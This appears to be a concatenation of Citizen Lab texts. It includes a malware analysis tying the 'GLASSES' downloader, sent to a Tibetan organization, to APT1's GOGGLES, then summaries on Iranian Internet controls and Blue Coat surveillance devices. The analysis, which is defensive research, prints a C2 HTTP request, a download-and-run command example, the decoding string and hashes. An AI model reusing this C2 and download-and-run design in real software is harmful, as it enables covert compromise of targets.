earlier to the head of an organization focused on Tibetan rights and issues, contains malware that is very similar to one program described in Appendix C (“The Malware Arsenal”) of Mandiant’s report, which they named “GOGGLES.” (We have previously reported on other targeted attacks against Tibetan organizations, such as the recent PlugX RAT and the LURK variant of Gh0st RAT.)\nThe malicious program analyzed at Citizen Lab shares both a large percentage of code and the same command and control (C2) infrastructure as the program described in the APT1 report. We are calling this program GLASSES because it is related to GOGGLES and uses a compromised eyeglasses storefront website as its C2 server.\nGLASSES is particularly interesting because it demonstrates that APT1 is not limited to attacks against industrial and commercial organizations, but also targets civil society organizations. It is unlikely that our study’s participant is the only civil society target of APT1 malware, although no attacks against civil society organizations have been documented in the Mandiant report. Both Mandiant and Shadowserver have included a Tibetan-themed domain in domain lists, supporting the idea that other organizations are targeted, but have not included any information on the details of Tibetan-related APT1 operations. A Bloomberg article mentions that the nonprofit organization International Republican Institute was compromised by the same group in June 2011, but no technical details of the attack were released.\nCivil society organizations such as the study participant that received this email are frequently and persistently attacked just the same as corporate and government targets. However, reporting on such attacks by security vendors is less common: these vendors generally lack visibility into civil society, as civil society organizations often do not have the resources to buy their security products or services. This may be the reason for the lack of reference to civil society targets in Mandiant’s APT1 report, as it is likely that Mandiant has better visibility into corporate and government targets through their client base.\nTargeted Email and Infection\nOn March 17, 2011, we were forwarded an email sent on April 28, 2010 from a Yahoo! webmail address to someone at one of our participating organizations. The email is written in English, and references the recipient’s organization by name.\nFig 1: Email forwarded from study participant\nSome details of the email immediately flag it as suspicious: the name in the email address is “Nate Herman” (see Figure 2 below for full header details and other information) although the email is signed “Martin Lee.” The forwarded email included full headers, so we were able to obtain more information about its origin (Yahoo! includes the sender’s source IP in the headers when an email is sent over the webmail interface). In this case, the originating IP is 69.95.255.26, which is registered to One Communications, Inc. / EarthLink Business, and is very similar to IPs used in a similar attack — demonstrating that this attack is not isolated, and the IPs are likely being reused for other malware campaigns.\nFig 2: Email imported into our analysis system, showing the sender name, original date, sending IP, and other details\nThis email contains a link to a ZIP file located at hxxp://tcw.homier.com/attchments/details.zip (MD5: 6fb3ecc3db624a4912ddbd2d565c4995). The homier.com domain belongs to Homier Distributing Company, Inc. and appears to have been compromised. A search for this subdomain can find other instances of malware hosted there, such as that detailed in ThreatExpert’s report on 87e840054d37f83c5077e685d45c0abb indicating a file in /images/update.bin, and another malicious program getting the file /attachments/SalaryAdjustment.zip.\nThe details.zip file contains a single executable file, Save my Tibetan wife – for [targeted organization’s name].exe (MD5: 356fc183b7e73a74383fdb1e74f84709) which pretends to be a folder by using the same icon as a folder:\nFig 3: The executable (“Application”) file pretending to be a folder\nWhen the executable is run, it deletes itself, then creates and opens a folder of the same name with a PDF document (filename: details.pdf, MD5: a3cd8f45eef80eacb6bf3d2415139efa) in it. From the user’s perspective, this is almost indistinguishable from opening an actual folder:\nFig 4: Actual folder with PDF\nThe PDF is not malicious, but it is damaged: the header and EOF markers have been deleted, and there is no xref table. As a result, Adobe Reader and other PDF viewing programs are unable to open it.\nFig 5: Broken xref table at end of embedded PDF\nThe content of the PDF implies that it was repurposed from a job posting regarding a position relating to public health in association with USAID in Nepal. Objects that are not displayed have information about what appears to be a real job posting, and the author metadata seems to be from a real person at the organization. Because the content is not directly related to the subject matter of the email, it suggests that it is not meant to be opened and may have been reused from a previous attack against a different organization.\nFig 6: Text relating to USAID/Nepal-related job posting\nMeanwhile, the original program drops an executable named spkptdhv.exe (MD5: 80a45ce5d3cc416fffdafa101bdf002c) in %temp%, and adds itself to the registry in order to restart on reboot.\nMalware – “GLASSES”\nThe dropped executable connects to a website and downloads a single HTML page. The site appears to be part of a legitimate website for an eyeglasses company, suggesting that it has been compromised. We contacted the hosting provider of the compromised site in March 2011, but never received any response.\nThe HTTP request includes a marker in the User-Agent string, indicating that it is was sent by this malware:\n\r\nGET /ewpindex.htm HTTP/1.1\r\nUser-Agent: Mozilla/4.0 (compatible; Windows NT 5.1; MSIE 7.0; Trident/4.0; Clj26Dbj.XYZ)\r\nHost: ewplus.com\r\nCache-Control: no-cache\r\n\nThe marker string has two parts, separated by a period. The first part (“Clj26Dbj”) is an encoded version of the computer’s name, presumably for tracking which machines at an organization are infected. The second part (changed to “XYZ” here) appears to be a campaign code, as the original is the standard abbreviation for the organization to which it was sent.\nThe marker may be in the User-Agent string so that it shows up in the access log on the web server, indicating that the attacker has access to these logs and may monitor them for signs of infection. As the User-Agent string shows up in web access logs, it would be simple for an attacker to monitor for compromised computers connecting to the C2 server this way.\nThe command from the compromised web page (ewpindex.htm) looks like this:\nFig 7: How the C2 server (a compromised web page) issues commands\nThe accessed page contains an anchor with an encoded command in it. The malware looks for the string in the anchor tag with the target NewRef, and then decodes it to a command. The link itself is empty, so that there is nothing to click on and it is invisible on the page. Another page on the same site, aboutus.htm, contains a different command although the URL is not apparently used by this binary.\nThe commands found on the website are:\n\n\n\nPage\nEncoded\nDecoded\n\n\newpindex.htm\nKVHc6Gcj\ns:120\n\n\naboutus.htm\nKVHe6ibj\ns:30\n\n\n\nLooking through the malware code, it is evident that this is a simple downloader with only two commands. The commands are:\n\n\n\nCommand Character\nCommand\nDescription\nExample\n\n\ns\nSleep\nSleep for specified number of minutes\ns:120\n\n\nr\nDownload and Run\nDownload and run executable binary at specified location on the web\nr:http://www.foo.com/bar.exe\n\n\n\nThe C2 server is still live, but it has the same sleep command as it did when we reported the compromise to the hosting provider approximately two years ago. It is unknown whether this means the attackers have lost control over the compromised server, or whether it is still live — for example, it may require manual intervention to change the page to a download command, and this may only happen when logs of an infected computer appear again. The attackers may choose only to provide a malicious second stage program for GLASSES to download and execute when they have verified the target, or may only keep the download link live for a very short amount of time to discourage its discovery and analysis. At no point in our investigation of this malware did the command string change from this sleep command.\nComparison to GOGGLES, an APT1 Attack\nIn “Appendix C: The Malware Arsenal” of the Mandiant APT1 report, the authors describe and give names to 49 different malicious programs. One of these is called “GOGGLES” — a simple downloader that is controlled via encoded markers in files accessed over HTTP.\nThe C2 communication method, commands, and particularly the data encoding method in GOGGLES are very similar to the sample we analyzed. The connection was initially noticed due to a shared string used in decoding methods, and the presence of the same two commands for each program. Follow-up code analysis confirmed that these programs share much of the same code, and use the same C2 server. It is very likely that GOGGLES is a later version of GLASSES.\nDecoding Algorithm\nIn GLASSES, the URL for the webpage and the campaign code are not found in plain text inside of the binary. The program keeps the information stored in an encoded format that is not immediately recognizable. However, the decoding function uses a very recognizable string, “thequickbrownfxjmpsvalzydg,” which is how we were able to quickly identify this malware as being possibly related to APT1:\nFig 8: Decoding function with “the quick brown fox” string\nThis decoding method is mentioned in the Mandiant report multiple times, used by the GOGGLES malware as well as three other malicious programs (SWORD, NEWSREELS, and LONGRUN).\nSharing C2 Domain with GOGGLES\nWhen we first analyzed the sample in March 2011, we searched a private malware database for related network traffic and found the following results:\n\nAt the time, the significance of the file 4poval.jpg was not immediately clear. Upon casual inspection, it seems to be an image that is related to the website content:\n\nThe Mandiant report describes GOGGLES sending an initial HTTP GET request for a JPEG image file with an embedded control command. The command offset is stored six bytes before the end of the file, and the command has a magic value (an arbitrary string of bytes) to indicate that it is actually a GOGGLES command file, and not just image data:\nFig 9: GOGGLES download file format, from Appendix C of the Mandiant APT1 report\nChecking the 4poval.jpg file (still available on the website as of February 2013) shows that the GOGGLES command data is present.\nFig 10: GOGGLES C2 data in image file\nSix bytes from the end of the file is the four byte offset 00 00 09 68. The bytes ff 02 b7 bc at offset 0x968 are the magic value described in the Mandiant report (in reverse order due to byte ordering), confirming that this is a GOGGLES control file.\nSince the two malware programs use the same domain for command and control and share much of the same code, it is very likely that these programs are used by the same group. The GOGGLES code is more sophisticated than the GLASSES code: in addition to a more effective method of hiding the command data, it also has more countermeasures to protect against reverse engineering and hide itself on the infected system. For this reason, it is very likely that GOGGLES is a later version of GLASSES.\nAnalysis of GOGGLES Sample\nA search using the VirusTotal Malware Intelligence service for the MD5 of the sample found in our network traffic database found a copy of the GOGGLES program that downloads the command image from this C2 server. Comparing this GOGGLES binary 64c47ead2e95e4033f0f1f1fedaf15cf (which uses the above image file to receive commands) to the behavior described in the Mandiant report does not result in a 100% behavior match. The User-Agent string does not exactly match the one described in the report, but uses one similar to the GLASSES sample. After the normal user-agent information, there are two strings, which likely correspond to the encoded computer name (“Alj26Bbj”) and campaign code (“RUCK”).\nFig 11: Found GOGGLES sample C2 communication\nThe User-Agent string that is different than that described in the Mandiant report shows that the behavior of GOGGLES was changing while in use, strengthening the idea that GLASSES may be an earlier development of the same malware family.\nFig. 12: Commonalities between GLASSES and GOGGLES samples\nConclusions and Recommendations\nThe description of GOGGLES in the Mandiant report and its attribution to APT1 has given us enough information to attribute a similar attack to them as well. This attack, which we are calling GLASSES, took place in April 2010 and was targeted against a Tibetan human rights organization. This demonstrates that APT1 is interested not only in industrial and commercial targets, but civil society organizations as well.\nThe sample of GLASSES we were sent has many technical similarities to Mandiant’s description of GOGGLES, including specific strings used for encoding and decoding. While this suggests that the two programs are related, there are other possible explanations for this connection, such as an attack found in the wild and repurposed by a new group. By searching for related network traffic, however, we were able to discover a file on the GLASSES server which contains GOGGLES control information — a clear indication that the malware is being operated by the same group.\nUsing VirusTotal’s Malware Intelligence service, we were able to find a copy of the specific GOGGLES binary using the same C2 server. Analysis of this GOGGLES sample revealed behavior that was similar but not exactly the same as the behavior described in the Mandiant report. The difference in behavior between the GOGGLES versions suggests that the malware was under active development during the time period of the attacks. Because GLASSES is a simpler version of GOGGLES with the same commands but fewer countermeasures against reverse engineering and analysis, it is likely that GLASSES is an earlier version of GOGGLES.\nThe vector for the GLASSES attack we observed was consistent with the modus operandi for APT1 described by the Mandiant report: a targeted email sent to an English-speaking target, using a set of compromised computers as jumping points. This type of threat is very dangerous to civil society organizations as well as industrial and commercial targets.\nAs with other targeted email attacks, organizations can protect themselves against this kind of attack by treating email with caution, especially email with attachments or links. A more detailed set of recommendations for defending against email and other threats can be found at Citizen Lab’s page on Recommendations for Defending Against Targeted Cyber Threats.\n\nAbout The Author\nSeth Hardy is a Senior Security Analyst at the Citizen Lab, Munk School of Global Affairs, University of Toronto.

    "text": "\n\t\t\t\tCrossposted from the OpenNet Initiative blog.\nThis report, titled “After the Green Movement: Internet Controls in Iran, 2009-2012“, details Iran’s increasing Internet controls since 2009, when protests against the victory of Iranian President Mahmoud Ahmedinejad rocked the country.\nThe election protest campaign–dubbed the “Green Movement”–was marked for the high use of social media and other information and communication technologies (ICT) to organize protests and disseminate information. Since the protests, however, the regime has tightened its controls on the use of ICTs while also seeking to use that technology to promote its own national narrative in cyberspace.\nWhile the filtering of web content has continued unabated, Iran has increasingly moved toward political centralization of its control regime, involving members of the country’s religious, administrative, and defence organizations as stakeholders in what the government sees as an ideological threat against the country’s values and national security.\nKey findings from the report include:\n\nSince the “Green Movement” protests in 2009, the Iranian regime has adopted increasingly complex surveillance and monitoring techniques, complementing Internet filtering with legal frameworks and information manipulation.\nThese techniques of control overlap: Internet filtering is reinforced by a more constricted legal environment and efforts to “nationalize” Iranian cyberspace.\nONI testing over the past several years has revealed consistent filtering of websites pertaining to social media, international news channels, non-Shi’ite religions, social and religious taboos, and anything remotely opposed to official government policies.\nThe creation of the Supreme Council on Cyberspace indicates the Iranian government’s interest in centralizing their approach towards the Internet as well as their view of cyberspace as a larger security concern.\nInternet censorship in Iran—culminating in the National Information Network—is framed as a way to protect the nation’s unique culture and identity and defend against the onslaught of Westernization.\nThe Iranian regime considers cyberspace a geopolitical as much as a domestic policy realm. Surveillance and censorship are simultaneously tools of suppression and a means of national defence.\n\nRead the full report [PDF] (Updated 11 March 2013)\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF version\nRead The New York Times article associated with this report.\nThe following individuals contributed to this report:\nMorgan Marquis-Boire (lead technical research) and Jakub Dalek (lead technical research), Sarah McKune (lead legal research), Matthew Carrieri, Masashi Crete-Nishihata, Ron Deibert, Saad Omar Khan, Helmi Noman, John Scott-Railton, and Greg Wiseman.\nSummary of Key Findings\n\nBlue Coat Devices capable of filtering, censorship, and surveillance are being used around the world. During several weeks of scanning and validation that ended in January 2013, we uncovered 61 Blue Coat ProxySG devices and 316 Blue Coat PacketShaper appliances, devices with specific functionality permitting filtering, censorship, and surveillance.\n\n\n61 of these Blue Coat appliances are on public or government networks in countries with a history of concerns over human rights, surveillance, and censorship (11 ProxySG and 50 PacketShaper appliances). We found these appliances in the following locations:\n\nBlue Coat ProxySG: Egypt, Kuwait, Qatar, Saudi Arabia, the UAE.\nPacketShaper: Afghanistan, Bahrain, China, India, Indonesia, Iraq, Kenya, Kuwait, Lebanon, Malaysia, Nigeria, Qatar, Russia, Saudi Arabia, South Korea, Singapore, Thailand, Turkey, and Venezuela.\n\n\n\n\nOur findings support the need for national and international scrutiny of Blue Coat implementations in the countries we have identified, and a closer look at the global proliferation of “dual-use” information and communication technologies. Internet service providers responsible for these deployments should consider publicly clarifying their function, and we hope Blue Coat will take this report as an opportunity to explain their due diligence process to ensure that their devices are not used in ways that violate human rights.\n\nPart I: Background and Context\nBlue Coat Systems is a California-based provider of network security and optimization products. These products include: ProxySG devices that work with WebFilter,1 which categorizes web pages to permit filtering of unwanted content; and PacketShaper, a cloud-based network management device that can establish visibility of over 600 web applications and control undesirable traffic.2 ProxySG provides “SSL Inspection” services to solve “…issues with intercepting SSL for your end-users.”3 PacketShaper is integrated with WebPulse, Blue Coat Systems’ real-time network intelligence service that can filter application traffic by content category.4 Blue Coat Systems states that it “provides products to more than 15,000 customers worldwide,”5 and indeed, it maintains offices globally, including in Latin America, the Middle East, and the Asia Pacific region.6\nIn 2011, researchers (including a team from the Citizen Lab) found evidence of the use of Blue Coat Systems products in Syria. These findings raised concerns that Blue Coat products were being used as part of the network filtering and monitoring apparatus of the Syrian government, known for its violations of human rights and widely condemned crackdown against ongoing domestic opposition. In such provision of secure web gateway and filtration products, Blue Coat Systems exemplifies the manufacture and service of so-called “dual use” technology: information and communication technology (ICT) that may equally serve legitimate and positive purposes, or purposes resulting in adverse impact on human rights, depending on its deployment or particular “end use.”7\nIn August 2011, the website Reflets.info, in collaboration with Telecomix and Fhimt.com, began to release a series of blog posts concerning the use of Blue Coat Systems devices in Syria.8 Reflets.info documented the presence of Blue Coat devices through in-country testing done in collaboration with Telecomix,9 and in October 2011, Telecomix released 54 gigabytes of data purportedly consisting of Syrian censorship log files collected from Blue Coat devices active in Syria.10\nInitially, Blue Coat Systems denied that its equipment had been sold to Syria,11 a country subject to US sanctions.12 Soon after, however, Blue Coat Systems acknowledged that at least thirteen of its devices were active in Syria and that these devices had been communicating with Blue Coat Systems-controlled servers. In October 2011, the company told the Wall Street Journal that it had shipped the devices to a distributor in Dubai, believing that they were destined for the Iraqi Ministry of Communications.13\nIn November 2011, following Blue Coat Systems’ admission, Citizen Lab researchers documented the use of Blue Coat Systems commercial filtering products in both Syria and Burma, in the report Behind Blue Coat: Investigations of commercial filtering in Syria and Burma.14 Employing network scans of publicly accessible servers in the IP address ranges of the Syrian Telecommunications Establishment, the Citizen Lab report identified devices in Syria not previously identified in the first Reflets and Telecomix release. In the case of Burma, the findings were gathered on the basis of data gathered from in-country field testing and research.15\nBlue Coat Systems soon announced in a statement that it was no longer “providing support, updates or other services” to its ProxySG appliances in Syria. The company stated that its devices in Syria were no longer “able to use Blue Coat’s cloud-based WebPulse service” or “run the Blue Coat WebFilter database” and were now “operating independently.” Blue Coat Systems added they did not have a “kill switch” to remotely disable the devices.16 An experiment conducted by Citizen Lab researchers, over a period of three weeks in July 2012, revealed evidence that suggests Blue Coat devices in Syria were no longer ‘phoning home’ to Blue Coat Systems’ servers. Citizen Lab also found that many Blue Coat Systems domains were being blocked in Syria, perhaps to prevent existing devices from receiving updates.17\nThe US Department of Commerce launched an investigation to determine whether Blue Coat Systems had prior knowledge of the use of its equipment in Syria.18 The investigation was launched following a call from US Senators requesting an investigation into Blue Coat Systems and NetApp, another US company whose equipment had been implicated in Syria’s surveillance system as detailed by Bloomberg shortly before the publication of Citizen Lab’s Blue Coat reports.19 In December 2011, the US Department of Commerce’s Bureau of Industry and Security (BIS) added one individual and one company based in the United Arab Emirates to its Entity List for purchasing US commercial filtering products from Blue Coat and exporting the products to Syria.20\nPart II: Fingerprinting the Global Network of Blue Coat Systems Devices\nA: Methodology\nThis project set out as an effort to understand the widespread nature and geographic spread of Blue Coat Systems’ commercial filtering and traffic inspection products, using several techniques to identify Blue Coat devices. It is not intended to provide an exhaustive enumeration of all Blue Coat hosts on the Internet.\nFrom December 2012 to mid-January 2013, we used the Shodan Computer Search Engine to search for Blue Coat PacketShaper and Blue Coat ProxySG hosts.21 Results from the Shodan Computer Search Engine were subsequently verified by scanning22 and followed by manual inspection. In addition to surveying Shodan for Blue Cost hosts, we undertook substantial whole-country scanning from hosts in Europe and the US.\nOur investigation yielded a significant number of hosts identifying themselves in ways that indicated they were a Blue Coat device, including Telnet and FTP banners, specific HTML pages, and so on. Because of our primary interest in devices that could be used for surveillance, filtering, and censorship, we narrowed in on PacketShaper and ProxySG Blue Coat appliances. We then worked through the results of our initial scanning, and excluded many devices from our final analysis that could not be identified with high confidence as PacketShaper and ProxySG appliances.\nThe installations included in the final report met the following criteria: (1) a Blue Coat Systems ProxySG or PacketShaper device on what we think is a public network (i.e. not a private company), (2) located in a country that is the subject of ongoing concern over compliance with international human rights law, legal due process, freedom of speech, surveillance, and censorship.\nB: Results\nThe scanning and validation process yielded 61 Blue Coat ProxySG devices and 316 Blue Coat PacketShaper devices located all over the world. Of these, we identified 11 ProxySG and 50 PacketShaper devices on public or government networks in countries with a history of concerns over human rights, surveillance, and censorship. These hosts were present on either government networks or on netblocks associated with telecommunication companies that provide Internet access of some sort. Specific efforts were made to exclude devices we believed to be on health, education, or commercial networks not associated with providing Internet service or telecommunications. The only exception is a device we found on the “King Abdulaziz City for Science and Technology” network which, although it is an educational institution, is involved in the implementation of national filtering.23\nHosts found to be used on health, education or commercial networks are included in the maps to display the widespread use of this technology, but will not be specifically discussed in this report.\nWe identified ProxySG installations in the following countries of interest: Egypt, Saudi Arabia, Kuwait, the United Arab Emirates, and Qatar. We have also noted that Shodan has reported Egyptian ISP Nile Online as having a ProxySG installation as recently as August 2012, although we were unable to identify it in our testing. Nevertheless, we have decided to include it in our results because of its recent detection by Shodan.\nWe discovered PacketShaper installations in the following countries of interest: Afghanistan, Bahrain, China, India, Indonesia, Iraq, Kenya, Kuwait, Lebanon, Malaysia, Nigeria, Qatar, Russia, Saudi Arabia, South Korea, Singapore, Thailand, Turkey, and Venezuela. We were able to visit these hosts and confirm that they were running the product. Bahrain is the only exception; however, Shodan has reported the presence of a PacketShaper installation as recently as December 31, 2012. This host was located on ASN named “BIX-AS Bahrain Internet Exchange.” Using the service provided by iplocation.net, the IP in question was listed as being on an ISP named the “Central Informatics Organisation” by two data location companies: maxmind and db4.\nProxySG and PacketShaper deployments:\n\nMap of BlueCoat worldwide deployments in countries of interest.

We’ve focused on a subset of cases where our scanning identified Blue Coat devices in countries with widely-reported concerns over legal due process, human rights, and transparency, especially pertaining to filtering, censorship or surveillance. What emerged is a picture of the global spread of Blue Coat devices to countries where their presence raises substantial concerns. The picture varies across regions and between countries, and we think these are a natural topic for further research, especially as this pertains to our findings.\nWe found Blue Coat devices in all countries of the Gulf Cooperation Council except Oman (Bahrain, Kuwait, Qatar, Saudi Arabia, and the United Arab Emirates). These states all have well known and pervasive regimes of Internet content filtering, so the presence of Blue Coat filtering products is not surprising. In several cases it has already been reported on.24\nThe region is also experiencing massive growth in Internet penetration, triggering aggressive marketing efforts by Western technology companies, intent on accessing these new markets. Less well known, however, is the extent of domestic electronic surveillance regimes in these countries, particularly in light of crackdowns on domestic dissent in Bahrain and Saudi Arabia, and where the devices we found were in locations suggestive of national filtering.\nThe finding of a Blue Coat device in Egypt is noteworthy in light of the widespread condemnation of the Mubarak regime’s use of electronic surveillance to monitor activists that came to light after the 2011 Revolution.25 The Egyptian government has reportedly continued to acquire the means to filter and surveil its national Internet using Deep Packet Inspection, and has recently proposed new online content regulations.26\nThe case of Blue Coat products in Lebanon is interesting because, while the country does not have a history of Internet filtering,27 the government has recently drafted online content regulations concerning public morals.28 This makes Lebanon a good case for follow-up research to clarify the function of these devices.\nIraq and Afghanistan are especially noteworthy cases. As they undergo reconstruction, both countries are the subject of international concern and scrutiny for ongoing human rights abuses, including a trend towards greater regulation and criminalization of some aspects of free expression,29 including freedom of the press.30 Additional concerns have been raised over increasing pressure by these governments on ISPs to implement these controls and submit to monitoring requirements.31 In both cases, Blue Coat products have the necessary features to help ISPs comply with these requests. The presence of these devices raises serious concerns about “surveillance-by-design” being built in from the ground up as the countries undergo reconstruction and expansion in telecommunications sectors.\nIn China we found several Blue Coat devices on a state-controlled ISP. The country is known for its comprehensive and multifaceted Internet filtering and surveillance regime, often referred to as the “Great Firewall.”32\nRussia and Venezuela are noteworthy because of serious concerns about the regimes in power, and their track record of using unlawful surveillance along with non-technical means to control political dissent and opposition.33\nElsewhere, Turkey has recently passed a series of laws empowering ISPs to filter a wide range of content,34 and in India, government agencies are explicitly authorized to monitor and intercept Internet traffic and user information for purposes of national security or cyber security.35\nThe government of South Korea, despite its sophisticated telecommunications sector, has an extensive set of legal and technical mechanisms to control online content and expression, although the overall rate of filtering is low.36 Meanwhile, the case of Kenya is also potentially interesting as the government is reportedly in the process of implementing a domestic monitoring apparatus.37\nBlue Coat products emerged repeatedly in Southeast Asia, where technology sectors and Internet penetration are growing rapidly, and new forms of online activism pose challenges to ruling governments: Malaysia has a documented history of state control, regulation, and monitoring of online expression, and recent legislation in the country authorizes warrantless interception with a vaguely defined scope.38 Thailand engages in widespread Internet filtering and blocking, supplemented with substantial non-technical legal mechanisms.39 Currently, the Thai government is extending its ability to engage in surveillance and monitoring, explicitly for the purpose of unmasking those engaging in speech critical of the monarchy.40\nIndonesia employs widespread but inconsistent filtering that emphasizes blocking content featuring some sexual, gender, and religious themes, and access to circumvention tools.41 With respect to Singapore, which implements limited Internet filtering, but has broad general censorship focused on potentially divisive racial, political, or religious content, a 2006 Privacy International report found that Singaporean law permits government surveillance of Internet activity and “grants law enforcement broad power to access data and encrypted material when conducting an investigation.”42\nA more complete overview of each of the countries of interest can be found in Appendix A.\nPart III: Export of Dual-Use Information and Communication Technologies—Ethical and Legal Considerations\nThe geographic spread of Blue Coat Systems technology outlined above, including within countries that have presented significant human rights concerns, highlights the importance of addressing at a number of levels the expanding dual-use ICT sector. Blue Coat Systems is only one of many participants in this industry, which includes numerous types of technologies and services utilized by governments as well as private actors. With respect to the market for secure web gateway solutions alone—which primarily include filtering software and related products such as those of Blue Coat Systems—analysts estimated the size of the market at nearly US$1.2 billion in 2012, and recognized five market leaders (Blue Coat Systems, Cisco, McAfee, Websense, and Zscaler), all of which are companies based in the US.43 Accordingly, the role of Western companies in providing dual-use technologies is a crucial subject for discussion among governments and policy makers, civil society, and the private sector. Such discussion is currently under way in a variety of fora, raising complex questions to which there are no simple solutions.\nOne of the key goals of the debates surrounding dual-use technologies is to determine a method of crafting effective controls on such technology that simultaneously limit its sale and deployment for purposes that negatively impact human rights, while protecting those uses that serve legitimate purposes and result in benefits to society. Such an approach requires an understanding of the likely end use of the technology in any given scenario, as well as carefully crafted legal and regulatory language to prevent over- or under-inclusiveness by companies when assessing whether particular products and services fall within the scope of controls.\nFor example, the Electronic Frontier Foundation (EFF) has warned of potential problems with legislation that is based on pre-defining types of technology “because broadly written regulations could have a net negative effect on the availability of many general-purpose technologies and could easily harm the very people that the regulations are trying to protect.”44 The EFF points out that legal terms to define harmful technology could encompass basic technologies such as web browsers, and would result in denying citizens of the use of basic technologies.45 Therefore, rather than focusing on the technology, the EFF advocates for a “Know Your Customer” approach, encouraging companies to investigate a customer before and during a transaction.46\nGovernment use of sanctions to control the flow of dual-use and other sensitive technologies to repressive regimes has run up against this dilemma. For example, while US sanctions against Iran and Syria restrict the sale by US companies of most goods and services to these countries, in order to support freedom of expression and access to information among the Iranian and Syrian populations, the US has found it necessary to issue general licenses enumerating that some (but not all) services related to Internet-based communications and telecommunications are authorized.47 Yet companies providing such services have in many instances erred on the side of caution and avoided providing technologies that would serve legitimate ends within these two countries altogether, given the possibility of significant penalties and reputational damage should they be found in violation of the sanctions.48 This collateral effect of the sanctions has had the unintended consequence of pitting US goals regarding isolation of authoritarian regimes and promotion of Internet freedom against each other. The need for precise, strategic language surrounding controlled technologies was reiterated in the US State Department’s November 2012 call for comments on its draft “Guidance on the Provision of ‘Sensitive Technology’ to Iran and Syria,” which concerns the scope of the term “sensitive technology” as utilized in the language of Iran and Syria sanctions.49\nIn addition to the matter of careful calibration of language to ensure clear and appropriate restrictions on dual-use technologies, is the matter of determining appropriate methods of control. While sanctions are perhaps one of the most potent methods of control given the significant penalties and policy interests at stake, their application is typically limited to those few countries that members of the international community generally agree represent threats to international order. Thus, the use of Blue Coat Systems technologies highlighted in this report is largely beyond the scope of sanctions, as, with the exception of certain limited sanctions applicable to Iraq50 and Lebanon,51 the countries in which Blue Coat Systems products were found are not currently subject to US sanctions—yet significant human rights concerns regarding the application of these technologies remain. Moreover, government entities involved in sanctions regimes that cover a wide variety of critical products and services, such as banking, petroleum products, insurance, etc., across multiple countries, may allocate a smaller percentage of their institutional resources to the matter of dual-use technologies, both in the drafting and enforcement of sanctions. Dual-use technologies employed in both the sanctioned and unsanctioned world therefore require further methods of attention, inquiry, and control.\nExport control frameworks offer an additional method for control of dual-use technologies, if effectively adapted to the issue. Export controls generally restrict the transfer of products that are “dual use” in the classic sense of having both commercial and military application, in order to protect national security, though other products may be covered as well. At the international level, the Wassenaar Arrangement covers dual use goods and technologies in the US, Canada, European Union, and other countries with participating countries committing to maintain national export controls on listed items—which include items related to “telecommunications” (Category 5, Part 1) and “information security” (Category 5, Part 2).52 Notably, the Wassenaar Arrangement served as grounds for the UK government to assert that FinFisher spyware reported by Citizen Lab and others53 was subject to export controls, arguing that the technology made use of controlled cryptography as listed Category 5, Part 2.54\nGenerally, however, international and national export controls have not proven applicable to so-called dual-use ICTs, given that many such products and services fall within the realm of commercial application or public security rather than military application or national security. For example, at the national level in the US, while a number of different agencies are involved in export control administration,55 licensing of most items of commercial nature is carried out by the Bureau of Industry and Security at the US Department of Commerce pursuant to the Export Administration Regulations.56 Depending on their destination, items on the Commerce Control List57 require a license to export if they fall within a designated “reason for control”—namely, if they are linked to chemical and biological weapons, nuclear nonproliferation, national security, missile technology, regional stability, firearms convention, crime control, or anti-terrorism.58 It appears unlikely that technologies such as the Blue Coat Systems ProxySG or PacketShaper products would fit these criteria to trigger the licensing requirement.\nIf export control frameworks are adapted to better incorporate dual-use ICTs, however, they might serve as a method to restrict provision of technologies that have potential to negatively impact human rights, on the basis of the characteristics of the technology in question and its ultimate destination. Such an approach would require political commitment by governments to develop significant additions to their export control regulations, a process that may also be complicated by necessary export control reforms already in progress on different fronts.59 Yet if companies were required to build compliance with export regulations into trade of dual-use ICTs, such mandate could serve as an important stimulus to internalization of human rights risk assessments in the surveillance and filtration technology industry, as well as overall corporate social responsibility (CSR) efforts. As with sanctions, the effectiveness of export control frameworks will depend on how carefully such regulations are calibrated.\nWhile the applicability of export controls in this industry is a matter for ongoing discussion, noteworthy steps in that direction are taking place within the EU, including with respect to its “Community regime for the control of exports, transfer, brokering and transit of dual-use items.”60 In September 2011, the European Parliament passed a resolution to prohibit authorization of the export of telecommunications technologies to certain specified countries if they are used “in connection with a violation of human rights, democratic principles or freedom of speech (…) by using interception technologies and digital data transfer devices for monitoring mobile phones and text messages and targeted surveillance of Internet use.”61 In October 2012, the European Parliament expanded upon its earlier effort, approving proposals put forward by Dutch Member of Parliament Marietje Schaake that would require authorization for any sale of dual-use technologies designated by European authorities as violative of human rights, democratic principles, or freedom of speech.62 Finally, the European Parliament passed a resolution in December 2012 on a “Digital Freedom Strategy,” which, inter alia, called for “a ban on exports of repressive technologies and services to authoritarian regimes” and establishment of a list of countries to which exports of “single-use” technologies (those that inherently threaten human rights) should be banned.63\nSuch multilateral efforts are essential to the success of export controls in curbing the inappropriate use of ICTs. A common justification of companies supplying such technology is that “if we don’t sell it, someone else will.” Coordinated international measures would help prevent problematic sales of dual-use technology by industry leaders in multiple countries, limiting the availability of top-of-the-line equipment and software that could effectively advance the state of surveillance and filtration within authoritarian regimes. It is noteworthy, therefore, that the European Parliament’s “Digital Freedom Strategy” also “calls for the inclusion of targeted repression technologies in the Wassenaar Arrangement,”64 which would extend the effort beyond the EU to the US, Canada, the Russian Federation, and other countries.\nCorporate social responsibility measures are another method relevant to control of dual-use technologies. Inappropriate use of a technology may stem from its technical attributes as well as the behavior of the company supplying or employing it, and it is essential that companies themselves take steps to prevent complicity in human rights compromise. ICT companies can draw on the significant progress that has been made on CSR standards over time, including the UN Guiding Principles on Business and Human Rights65 and the ICT sector guidance currently in development in the EU.66\nMoreover, companies such as Blue Coat Systems that make their profits in surveillance and filtering technology would be well-served to explore possibilities for effective self-regulation through CSR if they are indeed concerned about human rights, the possibility of onerous government requirements being imposed on them, or soured public relations. If, for example, Blue Coat Systems had conducted a human rights impact assessment or other due diligence measures regarding the use of its technology by client King Abdulaziz City for Science and Technology (KACST), perhaps it would have come to the conclusion that KACST was an agent of the government in national-level filtering, including of content related to political reform and human rights issues.67 It appears Blue Coat Systems may not have fully appreciated or addressed the ramifications of such deployment of its technology, given its inclusion in marketing materials of KACST as a client “success story.”68 On the other end of the spectrum, Websense, previously noted as one of the market leaders in secure web gateway solutions, has already taken steps toward CSR integration: it joined the Global Network Initiative (GNI) in December 2011, thus committing to the GNI’s freedom of expression and privacy principles and accountability framework.69 The more companies take proactive measures to prevent complicity in human rights abuses, the more normalization of corporate social responsibility will take place within the industry.\nA combination of the methods described above and other measures is essential to addressing the human rights impact 